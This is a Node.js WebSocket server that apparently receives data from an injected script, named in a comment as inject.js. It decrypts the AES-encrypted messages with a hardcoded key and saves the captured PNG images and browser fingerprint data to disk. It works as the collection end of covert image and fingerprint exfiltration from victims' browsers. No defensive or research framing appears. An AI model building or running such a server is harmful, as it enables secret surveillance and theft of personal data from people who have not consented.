const WebSocket = require('ws');
const crypto = require('crypto');
const fs = require('fs');

const wss = new WebSocket.Server({ port: 8080 });

// AES-256-CBC encryption key (32 bytes) - must match inject.js key
const ENCRYPTION_KEY = Buffer.from('0123456789abcdef0123456789abcdef', 'utf8');
const IV_LENGTH = 16; // AES block size

/**
 * Encrypts text using AES-256-CBC.
 * Returns a string in the format iv:encryptedData (hex encoded).
 */
function encrypt(text) {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let encrypted = cipher.update(text, 'utf8');
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString('hex') + ':' + encrypted.toString('hex');
}

/**
 * Decrypts text encrypted with AES-256-CBC.
 * Expects input format iv:encryptedData (hex encoded).
 */
function decrypt(text) {
  const textParts = text.split(':');
  if (textParts.length !== 2) {
    throw new Error('Invalid encrypted text format');
  }
  const iv = Buffer.from(textParts[0], 'hex');
  const encryptedText = Buffer.from(textParts[1], 'hex');
  const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let decrypted = decipher.update(encryptedText);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted.toString('utf8');
}

wss.on('connection', function connection(ws) {
  console.log('New WebSocket client connected');

  ws.on('message', function incoming(message) {
    try {
      // Decrypt incoming message
      const decrypted = decrypt(message);
      const data = JSON.parse(decrypted);

      // Save image data
      if (data.image) {
        const base64Data = data.image.replace(/^data:image\/png;base64,/, '');
        const filename = `captures/capture_${Date.now()}.png`;
        fs.writeFile(filename, base64Data, 'base64', (err) => {
          if (err) {
            console.error('Error saving image:', err);
          } else {
            console.log('Saved image:', filename);
          }
        });
      }

      // Save fingerprint data
      if (data.fingerprint) {
        const fpFilename = `captures/fingerprint_${Date.now()}.json`;
        fs.writeFile(fpFilename, JSON.stringify(data.fingerprint, null, 2), (err) => {
          if (err) {
            console.error('Error saving fingerprint:', err);
          } else {
            console.log('Saved fingerprint:', fpFilename);
          }
        });
      }
    } catch (e) {
      console.error('Error processing message:', e);
    }
  });
});
